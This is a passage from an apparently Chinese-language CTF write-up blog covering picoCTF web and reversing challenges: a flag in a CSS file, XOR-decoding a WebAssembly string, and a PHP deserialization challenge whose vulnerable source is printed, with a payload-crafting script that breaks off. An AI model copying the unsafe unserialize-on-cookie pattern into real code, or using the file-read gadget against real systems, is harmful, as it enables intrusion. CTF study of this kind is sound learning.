href="http://saturn.picoctf.net:58133/css/style.css%E5%8F%91%E7%8E%B0flag%60picoCTF%7B1nsp3ti0n_0f_w3bpag3s_587d12b8%7D%60">http://saturn.picoctf.net:58133/css/style.css发现flag`picoCTF{1nsp3ti0n_0f_w3bpag3s_587d12b8}`</a></p><p>这道题就是代码审查同标题，不过没啥营养</p><h2 id="some-assembly-required-2"><a class="markdownIt-Anchor" href="#some-assembly-required-2"></a> Some Assembly Required 2</h2><p>查看js代码，虽然代码被hex混淆过，但是我们仍然可以看出蹊跷，有键值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;copy_char&#x27;,&#x27;value&#x27;,&#x27;207aLjBod&#x27;,&#x27;1301420SaUSqf&#x27;,&#x27;233ZRpipt&#x27;,&#x27;2224QffgXU&#x27;,&#x27;check_flag&#x27;,&#x27;408533hsoVYx&#x27;,&#x27;instance&#x27;,&#x27;278338GVFUrH&#x27;,&#x27;Correct!&#x27;,&#x27;549933ZVjkwI&#x27;,&#x27;innerHTML&#x27;,&#x27;charCodeAt&#x27;,&#x27;./aD8SvhyVkb&#x27;,&#x27;result&#x27;,&#x27;977AzKzwq&#x27;,&#x27;Incorrect!&#x27;,&#x27;exports&#x27;,&#x27;length&#x27;,&#x27;getElementById&#x27;,&#x27;1jIrMBu&#x27;,&#x27;input&#x27;,&#x27;615361geljRK&#x27;]</span><br></pre></td></tr></table></figure><p>访问 <a href="http://mercury.picoctf.net:15406/aD8SvhyVkb">http://mercury.picoctf.net:15406/aD8SvhyVkb</a> 得到一个WebAssembly文件</p><p>然后我在项目<a href="https://github.com/WebAssembly/wabt">wabt</a>上面直接下载到了Windows(懒得传到Linux了)可用版本的二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\wasm-decompile.exe .\aD8SvhyVkb -o out.dcmp</span><br></pre></td></tr></table></figure><p>得到了反编译文本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">export memory <span class="title function_">memory</span><span class="params">(initial: <span class="number">2</span>, max: <span class="number">0</span>)</span>;</span><br><span class="line"></span><br><span class="line">global g_a:<span class="type">int</span> = <span class="number">66864</span>;</span><br><span class="line">export global input:<span class="type">int</span> = <span class="number">1072</span>;</span><br><span class="line">export global dso_handle:<span class="type">int</span> = <span class="number">1024</span>;</span><br><span class="line">export global data_end:<span class="type">int</span> = <span class="number">1328</span>;</span><br><span class="line">export global global_base:<span class="type">int</span> = <span class="number">1024</span>;</span><br><span class="line">export global heap_base:<span class="type">int</span> = <span class="number">66864</span>;</span><br><span class="line">export global memory_base:<span class="type">int</span> = <span class="number">0</span>;</span><br><span class="line">export global table_base:<span class="type">int</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">table T_a:funcref(min: <span class="number">1</span>, max: <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">data <span class="title function_">d_xakgKNsmnj8j9lk88mm1n9i1j8kl</span><span class="params">(offset: <span class="number">1024</span>)</span> =</span><br><span class="line"><span class="string">&quot;xakgK\Nsmn;j8j&lt;9;&lt;?=l?k88mm1n9i1j&gt;:8k?l0u\00\00&quot;</span>;</span><br><span class="line"></span><br><span class="line">export function <span class="title function_">wasm_call_ctors</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function <span class="title function_">strcmp</span><span class="params">(a:<span class="type">int</span>, b:<span class="type">int</span>)</span>:<span class="type">int</span> &#123;</span><br><span class="line">  var c:<span class="type">int</span> = g_a;</span><br><span class="line">  var d:<span class="type">int</span> = <span class="number">32</span>;</span><br><span class="line">  var e:<span class="type">int</span> = c - d;</span><br><span class="line">  e[<span class="number">6</span>]:<span class="type">int</span> = a;</span><br><span class="line">  e[<span class="number">5</span>]:<span class="type">int</span> = b;</span><br><span class="line">  var f:<span class="type">int</span> = e[<span class="number">6</span>]:<span class="type">int</span>;</span><br><span class="line">  e[<span class="number">4</span>]:<span class="type">int</span> = f;</span><br><span class="line">  var g:<span class="type">int</span> = e[<span class="number">5</span>]:<span class="type">int</span>;</span><br><span class="line">  e[<span class="number">3</span>]:<span class="type">int</span> = g;</span><br><span class="line">  loop L_b &#123;</span><br><span class="line">    var h:ubyte_ptr = e[<span class="number">4</span>]:<span class="type">int</span>;</span><br><span class="line">    var i:<span class="type">int</span> = <span class="number">1</span>;</span><br><span class="line">    var j:<span class="type">int</span> = h + i;</span><br><span class="line">    e[<span class="number">4</span>]:<span class="type">int</span> = j;</span><br><span class="line">    var k:<span class="type">int</span> = h[<span class="number">0</span>];</span><br><span class="line">    e[<span class="number">11</span>]:byte = k;</span><br><span class="line">    var l:ubyte_ptr = e[<span class="number">3</span>]:<span class="type">int</span>;</span><br><span class="line">    var m:<span class="type">int</span> = <span class="number">1</span>;</span><br><span class="line">    var n:<span class="type">int</span> = l + m;</span><br><span class="line">    e[<span class="number">3</span>]:<span class="type">int</span> = n;</span><br><span class="line">    var o:<span class="type">int</span> = l[<span class="number">0</span>];</span><br><span class="line">    e[<span class="number">10</span>]:byte = o;</span><br><span class="line">    var p:<span class="type">int</span> = e[<span class="number">11</span>]:ubyte;</span><br><span class="line">    var q:<span class="type">int</span> = <span class="number">255</span>;</span><br><span class="line">    var r:<span class="type">int</span> = p &amp; q;</span><br><span class="line">    <span class="keyword">if</span> (r) <span class="keyword">goto</span> B_c;</span><br><span class="line">    var s:<span class="type">int</span> = e[<span class="number">11</span>]:ubyte;</span><br><span class="line">    var t:<span class="type">int</span> = <span class="number">255</span>;</span><br><span class="line">    var u:<span class="type">int</span> = s &amp; t;</span><br><span class="line">    var v:<span class="type">int</span> = e[<span class="number">10</span>]:ubyte;</span><br><span class="line">    var w:<span class="type">int</span> = <span class="number">255</span>;</span><br><span class="line">    var x:<span class="type">int</span> = v &amp; w;</span><br><span class="line">    var y:<span class="type">int</span> = u - x;</span><br><span class="line">    e[<span class="number">7</span>]:<span class="type">int</span> = y;</span><br><span class="line">    <span class="keyword">goto</span> B_a;</span><br><span class="line">    label B_c:</span><br><span class="line">    var z:<span class="type">int</span> = e[<span class="number">11</span>]:ubyte;</span><br><span class="line">    var aa:<span class="type">int</span> = <span class="number">255</span>;</span><br><span class="line">    var ba:<span class="type">int</span> = z &amp; aa;</span><br><span class="line">    var ca:<span class="type">int</span> = e[<span class="number">10</span>]:ubyte;</span><br><span class="line">    var da:<span class="type">int</span> = <span class="number">255</span>;</span><br><span class="line">    var ea:<span class="type">int</span> = ca &amp; da;</span><br><span class="line">    var fa:<span class="type">int</span> = ba;</span><br><span class="line">    var ga:<span class="type">int</span> = ea;</span><br><span class="line">    var ha:<span class="type">int</span> = fa == ga;</span><br><span class="line">    var ia:<span class="type">int</span> = <span class="number">1</span>;</span><br><span class="line">    var ja:<span class="type">int</span> = ha &amp; ia;</span><br><span class="line">    <span class="keyword">if</span> (ja) <span class="keyword">continue</span> L_b;</span><br><span class="line">  &#125;</span><br><span class="line">  var ka:<span class="type">int</span> = e[<span class="number">11</span>]:ubyte;</span><br><span class="line">  var la:<span class="type">int</span> = <span class="number">255</span>;</span><br><span class="line">  var ma:<span class="type">int</span> = ka &amp; la;</span><br><span class="line">  var na:<span class="type">int</span> = e[<span class="number">10</span>]:ubyte;</span><br><span class="line">  var oa:<span class="type">int</span> = <span class="number">255</span>;</span><br><span class="line">  var pa:<span class="type">int</span> = na &amp; oa;</span><br><span class="line">  var qa:<span class="type">int</span> = ma - pa;</span><br><span class="line">  e[<span class="number">7</span>]:<span class="type">int</span> = qa;</span><br><span class="line">  label B_a:</span><br><span class="line">  var ra:<span class="type">int</span> = e[<span class="number">7</span>]:<span class="type">int</span>;</span><br><span class="line">  <span class="keyword">return</span> ra;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function <span class="title function_">check_flag</span><span class="params">()</span>:<span class="type">int</span> &#123;</span><br><span class="line">  var a:<span class="type">int</span> = <span class="number">0</span>;</span><br><span class="line">  var b:<span class="type">int</span> = <span class="number">1072</span>;</span><br><span class="line">  var c:<span class="type">int</span> = <span class="number">1024</span>;</span><br><span class="line">  var d:<span class="type">int</span> = <span class="built_in">strcmp</span>(c, b);</span><br><span class="line">  var e:<span class="type">int</span> = d;</span><br><span class="line">  var f:<span class="type">int</span> = a;</span><br><span class="line">  var g:<span class="type">int</span> = e != f;</span><br><span class="line">  var h:<span class="type">int</span> = <span class="number">-1</span>;</span><br><span class="line">  var i:<span class="type">int</span> = g ^ h;</span><br><span class="line">  var j:<span class="type">int</span> = <span class="number">1</span>;</span><br><span class="line">  var k:<span class="type">int</span> = i &amp; j;</span><br><span class="line">  <span class="keyword">return</span> k;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">copy</span><span class="params">(a:<span class="type">int</span>, b:<span class="type">int</span>)</span> &#123;</span><br><span class="line">  var c:<span class="type">int</span> = g_a;</span><br><span class="line">  var d:<span class="type">int</span> = <span class="number">16</span>;</span><br><span class="line">  var e:int_ptr = c - d;</span><br><span class="line">  e[<span class="number">3</span>] = a;</span><br><span class="line">  e[<span class="number">2</span>] = b;</span><br><span class="line">  var f:<span class="type">int</span> = e[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">if</span> (eqz(f)) <span class="keyword">goto</span> B_a;</span><br><span class="line">  var g:<span class="type">int</span> = e[<span class="number">3</span>];</span><br><span class="line">  var h:<span class="type">int</span> = <span class="number">8</span>;</span><br><span class="line">  var i:<span class="type">int</span> = g ^ h;</span><br><span class="line">  e[<span class="number">3</span>] = i;</span><br><span class="line">  label B_a:</span><br><span class="line">  var j:<span class="type">int</span> = e[<span class="number">3</span>];</span><br><span class="line">  var k:byte_ptr = e[<span class="number">2</span>];</span><br><span class="line">  k[<span class="number">1072</span>] = j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有函数<code>strcmp</code>、<code>copy</code>、<code>check_flag</code>，虽然checkflag这个函数看起来更像是处理函数，但是很明显他并没有处理全局数据<code>xakgK\Nsmn;j8j&lt;9;&lt;?=l?k88mm1n9i1j&gt;:8k?l0u</code>，这个也是更像flag处理过的文本，所以我们看copy函数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">xor(<span class="string">b&#x27;xakgK\Nsmn;j8j&lt;9;&lt;?=l?k88mm1n9i1j&gt;:8k?l0u&#x27;</span>,<span class="string">&quot;8&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到flag<code>picoCTF&#123;ef3b0b413475d7c00ee9f1a9b620c7d8&#125;</code></p><p>或者更简单的我们尝试暴力解决数据，这个方法在大多数时候都不可适用，就是用<a href="https://gchq.github.io/CyberChef/">cyberchef</a>选择magic，勾选上intensive mode，然后指定我们需要得到的目标字符串包含字符<code>pico</code>，也是可以解出来的</p><h2 id="super-serial"><a class="markdownIt-Anchor" href="#super-serial"></a> Super Serial</h2><p>先是认真审查了一边元素并没有什么有趣的地方，然后我们来到<code>robots.txt</code>看看爬虫规则，发现<code>Disallow: /admin.phps</code>,这就非常有趣了，phps可以允许访问者直接查看对应php的源码</p><p>我这里访问<code>index.phps</code>的时候发现显示不全，当时用的是FireFox，但是换了一个浏览器就显示完全了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;cookie.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$con</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&quot;../users.db&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"><span class="variable">$perm_res</span> = <span class="keyword">new</span> <span class="title function_ invoke__">permissions</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$perm_res</span>-&gt;<span class="title function_ invoke__">is_guest</span>() || <span class="variable">$perm_res</span>-&gt;<span class="title function_ invoke__">is_admin</span>()) &#123;</span><br><span class="line">+ (<span class="number">86400</span> * <span class="number">30</span>), <span class="string">&quot;/&quot;</span>);<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login&quot;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$perm_res</span>))), <span class="title function_ invoke__">time</span>() </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: authentication.php&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;&lt;h6 class=&quot;text-center&quot; style=&quot;color:red&quot;&gt;Invalid Login.&lt;/h6&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对应<code>authentication.phps</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">access_log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log_file</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$lf</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log_file = <span class="variable">$lf</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read_log</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">append_to_log</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;log_file, <span class="variable">$data</span>, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_log</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;log_file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;cookie.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$perm</span>) &amp;&amp; <span class="variable">$perm</span>-&gt;<span class="title function_ invoke__">is_admin</span>())&#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Welcome admin&quot;</span>;</span><br><span class="line"><span class="variable">$log</span> = <span class="keyword">new</span> <span class="title function_ invoke__">access_log</span>(<span class="string">&quot;access.log&quot;</span>);</span><br><span class="line"><span class="variable">$log</span>-&gt;<span class="title function_ invoke__">append_to_log</span>(<span class="string">&quot;Logged in at &quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Welcome guest&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对应<code>cookie.phps</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">permissions</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$u</span>.<span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_guest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$guest</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$con</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&quot;../users.db&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line"><span class="variable">$stm</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT admin, username FROM users WHERE username=? AND password=?&quot;</span>);</span><br><span class="line"><span class="variable">$stm</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">1</span>, <span class="variable">$username</span>, SQLITE3_TEXT);</span><br><span class="line"><span class="variable">$stm</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">2</span>, <span class="variable">$password</span>, SQLITE3_TEXT);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$stm</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$rest</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rest</span>[<span class="string">&quot;username&quot;</span>]) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rest</span>[<span class="string">&quot;admin&quot;</span>] != <span class="number">1</span>) &#123;</span><br><span class="line"><span class="variable">$guest</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$guest</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$con</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&quot;../users.db&quot;</span>);</span><br><span class="line">                <span class="variable">$username</span> = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">                <span class="variable">$password</span> = <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">                <span class="variable">$stm</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT admin, username FROM users WHERE username=? AND password=?&quot;</span>);</span><br><span class="line">                <span class="variable">$stm</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">1</span>, <span class="variable">$username</span>, SQLITE3_TEXT);</span><br><span class="line">                <span class="variable">$stm</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">2</span>, <span class="variable">$password</span>, SQLITE3_TEXT);</span><br><span class="line">                <span class="variable">$res</span> = <span class="variable">$stm</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">                <span class="variable">$rest</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$rest</span>[<span class="string">&quot;username&quot;</span>]) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$rest</span>[<span class="string">&quot;admin&quot;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                                <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$admin</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;login&quot;</span>]))&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$perm</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;login&quot;</span>])));</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$perm</span>-&gt;<span class="title function_ invoke__">is_guest</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$perm</span>-&gt;<span class="title function_ invoke__">is_admin</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Error</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Deserialization error. &quot;</span>.<span class="variable">$perm</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一道标准的php反序列化类型，可以参考<a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">Read This</a></p><p>这道题的漏洞就在于我们可以自己控制反序列化的对象，并且可以利用反序列化出错运行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">catch</span>(<span class="built_in">Error</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Deserialization error. &quot;</span>.<span class="variable">$perm</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而当一个对象被当作字符串输出的时候会自动调用__toString()魔法方法，来看看对应方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read_log</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_log</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;log_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们自己编辑php文件输出所需要加密字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">access_log</span></span></span><br><span class="line"><span 